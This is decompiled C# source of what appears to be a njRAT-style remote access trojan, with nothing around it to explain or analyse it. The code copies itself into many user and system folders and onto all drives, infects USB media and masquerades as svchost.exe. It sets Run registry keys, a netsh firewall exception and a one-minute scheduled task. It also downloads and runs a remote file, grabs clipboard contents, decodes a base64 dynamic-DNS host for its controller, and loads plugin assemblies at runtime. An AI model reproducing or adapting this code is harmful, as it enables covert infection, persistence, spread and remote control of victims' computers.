        string[] valueNames = Fransesco.F.Registry.CurrentUser.CreateSubKey("Software\\" + Fransesco.RG, RegistryKeyPermissionCheck.Default).GetValueNames();
        int index = 0;
        while (index < valueNames.Length)
        {
          string str19 = valueNames[index];
          if (str19.Length == 32)
            str18 = str18 + str19 + ",";
          checked { ++index; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return str17 + str18;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void INS()
    {
      Thread.Sleep(1000);
      if (Fransesco.Idr && !Fransesco.CompDir(Fransesco.LO, new FileInfo(Interaction.Environ(Fransesco.DR).ToLower() + "\\" + Fransesco.EXE.ToLower())))
      {
        try
        {
          if (System.IO.File.Exists(Interaction.Environ(Fransesco.DR) + "\\" + Fransesco.EXE))
            System.IO.File.Delete(Interaction.Environ(Fransesco.DR) + "\\" + Fransesco.EXE);
          FileStream fileStream = new FileStream(Interaction.Environ(Fransesco.DR) + "\\" + Fransesco.EXE, FileMode.CreateNew);
          byte[] array = System.IO.File.ReadAllBytes(Fransesco.LO.FullName);
          fileStream.Write(array, 0, array.Length);
          fileStream.Flush();
          fileStream.Close();
          Fransesco.LO = new FileInfo(Interaction.Environ(Fransesco.DR) + "\\" + Fransesco.EXE);
          Process.Start(Fransesco.LO.FullName);
          ProjectData.EndApp();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.EndApp();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Environment.SetEnvironmentVariable("SEE_MASK_NOZONECHECKS", "1", EnvironmentVariableTarget.User);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall add allowedprogram \"" + Fransesco.LO.FullName + "\" \"" + Fransesco.LO.Name + "\" ENABLE", AppWinStyle.Hide, true, 5000);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      if (Fransesco.Isu)
      {
        try
        {
          Fransesco.F.Registry.CurrentUser.OpenSubKey(Fransesco.sf, true).SetValue(Fransesco.RG, (object) ("\"" + Fransesco.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        try
        {
          Fransesco.F.Registry.LocalMachine.OpenSubKey(Fransesco.sf, true).SetValue(Fransesco.RG, (object) ("\"" + Fransesco.LO.FullName + "\" .."));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.IsF)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.oad)
      {
        try
        {
          Fransesco.H = Fransesco.DEB(ref Fransesco.H);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.wab)
      {
        try
        {
          Process.Start(Fransesco.w);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.str)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.n + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.n + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.n + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.sty)
      {
        try
        {
          MessageBoxIcon icon;
          if (Fransesco.rdp)
            icon = MessageBoxIcon.Question;
          else if (Fransesco.err)
            icon = MessageBoxIcon.Hand;
          else if (Fransesco.rda)
            icon = MessageBoxIcon.Exclamation;
          else if (Fransesco.rdi)
            icon = MessageBoxIcon.Asterisk;
          else if (Fransesco.rdn)
            icon = MessageBoxIcon.None;
          if (Fransesco.str)
          {
            int num1 = (int) MessageBox.Show(Fransesco.m, Fransesco.s, MessageBoxButtons.OK, icon);
          }
          else
          {
            MessageBoxButtons buttons;
            int num2 = (int) MessageBox.Show(Fransesco.m, Fransesco.s, buttons, icon);
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.ckp)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.RG + Fransesco.q + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.RG + Fransesco.q + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.RG + Fransesco.q + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.Hid)
      {
        try
        {
          System.IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.Usb)
      {
        try
        {
          Usb1.infect();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.tsk)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.nam)
      {
        try
        {
          Thread.Sleep(checked ((int) Math.Round(Math.Round(Math.Round(unchecked (Conversions.ToDouble(Fransesco.r) * 1000.0))))));
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.por)
      {
        try
        {
          if (!(Fransesco.prs == Conversions.ToBoolean("False") & Fransesco.exp == Conversions.ToBoolean("False") & Fransesco.ess == Conversions.ToBoolean("false") & Fransesco.sbi == Conversions.ToBoolean("false") & Fransesco.spy == Conversions.ToBoolean("false") & Fransesco.war == Conversions.ToBoolean("false") & Fransesco.dns == Conversions.ToBoolean("false") & Fransesco.aip == Conversions.ToBoolean("false") & Fransesco.tag == Conversions.ToBoolean("false") & Fransesco.sms == Conversions.ToBoolean("false") & Fransesco.rcd == Conversions.ToBoolean("false") & Fransesco.san == Conversions.ToBoolean("false") & Fransesco.ger == Conversions.ToBoolean("false") & Fransesco.mas == Conversions.ToBoolean("false") & Fransesco.ils == Conversions.ToBoolean("false") & Fransesco.@ref == Conversions.ToBoolean("false") & Fransesco.rfl == Conversions.ToBoolean("false") & Fransesco.exl == Conversions.ToBoolean("false")))
            CsAntiProcess.Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.ser)
      {
        try
        {
          new Thread(new ThreadStart(new AntiTaskManager().protect)).Start();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.top)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" + Fransesco.RG + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.prg)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.Dat)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.nat)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.cok)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Cookies) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.cok)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.Myd)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.Mus)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.his)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.History) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.fav)
      {
        try
        {
          string path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + Fransesco.g + ".exe";
          System.IO.File.Copy(Fransesco.LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + Fransesco.g + ".exe", true);
          Fransesco.FS = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.Favorites) + "\\" + Fransesco.g + ".exe", FileMode.Open);
          if (!System.IO.File.Exists(path))
            ;
          System.IO.File.Delete(path);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.spr)
      {
        try
        {
          string programFiles = MyProject.Computer.FileSystem.SpecialDirectories.ProgramFiles;
          string[] logicalDrives = Directory.GetLogicalDrives();
          int index = 0;
          while (index < logicalDrives.Length)
          {
            string str = logicalDrives[index];
            try
            {
              System.IO.File.Copy(Application.ExecutablePath, str + Fransesco.d + ".exe");
              System.IO.File.SetAttributes(str + Fransesco.d + ".exe", FileAttributes.Normal);
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.pad)
      {
        try
        {
          DriveInfo[] drives = DriveInfo.GetDrives();
          int index = 0;
          while (index < drives.Length)
          {
            DriveInfo driveInfo = drives[index];
            Application.DoEvents();
            Thread.Sleep(5);
            if (driveInfo.IsReady)
              System.IO.File.Copy(Application.ExecutablePath, driveInfo.RootDirectory.FullName + Fransesco.o, true);
            checked { ++index; }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.jva)
      {
        try
        {
          Registry.CurrentUser.OpenSubKey(Fransesco.v, true).DeleteValue(Fransesco.v, false);
          Fransesco.CriarChaveHKEYUSER(Fransesco.v, Fransesco.LO.FullName, "1");
          Fransesco.CriarChaveHKEYUSER(Fransesco.v, Fransesco.LO.FullName, "2");
          Fransesco.CriarChaveHKEYUSER(Fransesco.v, Fransesco.LO.FullName, "3");
          Fransesco.CriarChaveHKEYUSER(Fransesco.v, Fransesco.LO.FullName, "4");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.loc)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey(Fransesco.u, true).DeleteValue(Fransesco.k, false);
          Fransesco.CriarChaveHKEYUSER(Fransesco.u, Fransesco.LO.FullName, "1");
          Fransesco.CriarChaveHKEYUSER(Fransesco.u, Fransesco.LO.FullName, "2");
          Fransesco.CriarChaveHKEYUSER(Fransesco.u, Fransesco.LO.FullName, "3");
          Fransesco.CriarChaveHKEYUSER(Fransesco.u, Fransesco.LO.FullName, "4");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.ilc)
      {
        try
        {
          Registry.LocalMachine.OpenSubKey(Fransesco.x, true).DeleteValue(Fransesco.j, false);
          Fransesco.CriarChaveHKEYUSER(Fransesco.x, Fransesco.LO.FullName, "1");
          Fransesco.CriarChaveHKEYUSER(Fransesco.x, Fransesco.LO.FullName, "2");
          Fransesco.CriarChaveHKEYUSER(Fransesco.x, Fransesco.LO.FullName, "3");
          Fransesco.CriarChaveHKEYUSER(Fransesco.x, Fransesco.LO.FullName, "4");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (!Fransesco.sst)
        ;
      if (Fransesco.ter)
      {
        try
        {
          RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
          subKey.SetValue("DisableTaskMgr", (object) 0);
          subKey.Close();
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.trr)
      {
        try
        {
          new WebClient().DownloadFile(Fransesco.x, Interaction.Environ("tmp") + "/Explorer.exe");
          Interaction.Shell(Interaction.Environ("tmp") + "/Explorer.exe");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.usd)
      {
        try
        {
          Interaction.Shell("netsh firewall delete allowedprogram \"" + Fransesco.LO.FullName + "\"", AppWinStyle.Hide);
          Interaction.Shell("netsh firewall add allowedprogram \"" + Fransesco.LO.FullName + "\" \"" + Fransesco.LO.Name + "\" ENABLE", AppWinStyle.Hide);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      if (Fransesco.MEL)
      {
        if (Operators.CompareString(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe", false) == 0)
        {
          if (System.IO.File.Exists(Path.GetTempPath() + "melt.txt"))
          {
            try
            {
              System.IO.File.Delete(System.IO.File.ReadAllText(Path.GetTempPath() + "melt.txt"));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
          }
        }
        else if (System.IO.File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe"))
        {
          try
          {
            System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
          System.IO.File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
          Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
          ProjectData.EndApp();
        }
        else
        {
          System.IO.File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
          System.IO.File.WriteAllText(Path.GetTempPath() + "melt.txt", Application.ExecutablePath);
          Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\svchost.exe");
          ProjectData.EndApp();
        }
      }
      if (!Fransesco.MIN)
        return;
      try
      {
        string file = MyProject.Computer.FileSystem.SpecialDirectories.Temp + "/StUpdate.exe";
        MyProject.Computer.FileSystem.WriteAllBytes(file, System.IO.File.ReadAllBytes(Application.ExecutablePath), true);
        Interaction.Shell("schtasks /create /sc minute /mo 1 /tn StUpdate /tr " + file, AppWinStyle.Hide);
        Thread.Sleep(50);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public static void CriarChaveHKEYUSER(string Nome, string CaminhoExE, string Escolher)
    {
      try
      {
        if (Operators.CompareString(Escolher, "1", false) == 0)
          Registry.CurrentUser.CreateSubKey(Fransesco.x).SetValue(Nome, (object) CaminhoExE);
        else if (Operators.CompareString(Escolher, "2", false) == 0)
          Registry.CurrentUser.CreateSubKey(Fransesco.x).SetValue(Nome, (object) CaminhoExE);
        else if (Operators.CompareString(Escolher, "3", false) == 0)
        {
          Registry.LocalMachine.CreateSubKey(Fransesco.x).SetValue(Nome, (object) CaminhoExE);
        }
        else
        {
          if (Operators.CompareString(Escolher, "4", false) != 0)
            return;
          Registry.LocalMachine.CreateSubKey(Fransesco.x).SetValue(Nome, (object) CaminhoExE);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

    public object LORDDecrypt(string ParmDec) => (object) ParmDec;

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void ko()
    {
      string text = Clipboard.GetText();
      System.IO.File.WriteAllText(Path.GetTempPath() + "\\FransescoPast.txt", text);
      string Find = "FRANSESCO";
      string str = "Strik";
      try
      {
        Fransesco.P = Fransesco.DEB(ref Fransesco.P);
        if (Conversion.Val((object) DateTime.Today.Day) > Conversion.Val(MyProject.Computer.FileSystem.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\app")))
        {
          Fransesco.P = Conversions.ToString(2000);
          Fransesco.H = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace("aGFraW0z*i5kZG5zLm5ldA!!", "*", "M"), "!", "=")));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      MyProject.Computer.FileSystem.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\app", Conversions.ToString(DateTime.Today.Day), false);
      Fransesco.H = Encoding.UTF8.GetString(Convert.FromBase64String(Strings.Replace(Strings.Replace(Fransesco.H, Find, "M"), str, "=")));
      if (Interaction.Command() == null)
      {
        try
        {
          Fransesco.F.Registry.CurrentUser.SetValue("di", (object) "!");
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        Thread.Sleep(5000);
      }
      bool createdNew = false;
      Fransesco.MT = (object) new Mutex(true, Fransesco.RG, out createdNew);
      if (!createdNew)
        ProjectData.EndApp();
      Fransesco.INS();
      if (!Fransesco.Idr)
      {
        Fransesco.EXE = Fransesco.LO.Name;
        Fransesco.DR = Fransesco.LO.Directory.Name;
      }
      new Thread(new ThreadStart(Fransesco.RC), 1).Start();
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      int num = 0;
      string Left = "";
      if (Fransesco.BD)
      {
        try
        {
          SystemEvents.SessionEnding += new SessionEndingEventHandler(Fransesco.Lambda2);
          Fransesco.pr(1);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      while (true)
      {
        Thread.Sleep(1000);
        if (!Fransesco.Cn)
          Left = "";
        Application.DoEvents();
        try
        {
          checked { ++num; }
          if (num == 5)
          {
            try
            {
              Process.GetCurrentProcess().MinWorkingSet = (IntPtr) 1024;
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
          if (num >= 8)
          {
            num = 0;
            Fransesco.ACT();
            if (Operators.CompareString(Left, str, false) != 0)
            {
              Left = str;
              Fransesco.Send("act" + Fransesco.Y + str);
            }
          }
          if (Fransesco.Isu)
          {
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(Fransesco.F.Registry.CurrentUser.GetValue(Fransesco.sf + "\\" + Fransesco.RG, (object) "")), (object) ("\"" + Fransesco.LO.FullName + "\" .."), false))
                Fransesco.F.Registry.CurrentUser.OpenSubKey(Fransesco.sf, true).SetValue(Fransesco.RG, (object) ("\"" + Fransesco.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
            try
            {
              if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(Fransesco.F.Registry.LocalMachine.GetValue(Fransesco.sf + "\\" + Fransesco.RG, (object) "")), (object) ("\"" + Fransesco.LO.FullName + "\" .."), false))
                Fransesco.F.Registry.LocalMachine.OpenSubKey(Fransesco.sf, true).SetValue(Fransesco.RG, (object) ("\"" + Fransesco.LO.FullName + "\" .."));
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
              ProjectData.ClearProjectError();
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
    }

    public static string md5(byte[] B)
    {
      B = new MD5CryptoServiceProvider().ComputeHash(B);
      string str = "";
      byte[] numArray = B;
      int index = 0;
      while (index < numArray.Length)
      {
        byte num = numArray[index];
        str += num.ToString("x2");
        checked { ++index; }
      }
      return str;
    }

    private static int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength)
    {
      int num;
      return num;
    }

    public static object Plugin(byte[] b, string c)
    {
      Module[] modules = Assembly.Load(b).GetModules();
      int index1 = 0;
      while (index1 < modules.Length)
      {
        Module module = modules[index1];
        System.Type[] types = module.GetTypes();
        int index2 = 0;
        while (index2 < types.Length)
        {
          System.Type type = types[index2];
          if (type.FullName.EndsWith("." + c))
            return module.Assembly.CreateInstance(type.FullName);
          checked { ++index2; }
        }
        checked { ++index1; }
      }
      return (object) null;
    }

    public static void pr(int i)
    {
      try
      {
        Fransesco.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
    }

